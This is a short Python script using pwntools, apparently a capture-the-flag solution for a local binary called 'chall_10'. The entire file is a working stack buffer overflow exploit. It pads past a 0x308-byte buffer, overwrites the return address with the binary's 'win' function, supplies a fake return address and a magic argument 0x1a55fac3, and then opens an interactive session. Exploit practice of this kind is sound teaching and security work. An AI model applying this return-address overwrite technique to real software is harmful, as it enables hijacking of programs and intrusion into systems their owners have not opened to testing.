# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_10")
    elf= ELF("./chall_10")
    p= b'a'* 0x308+ b'a'* 4+ p32(elf.sym.win)+ b'c'*4+ p32(0x1a55fac3)
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
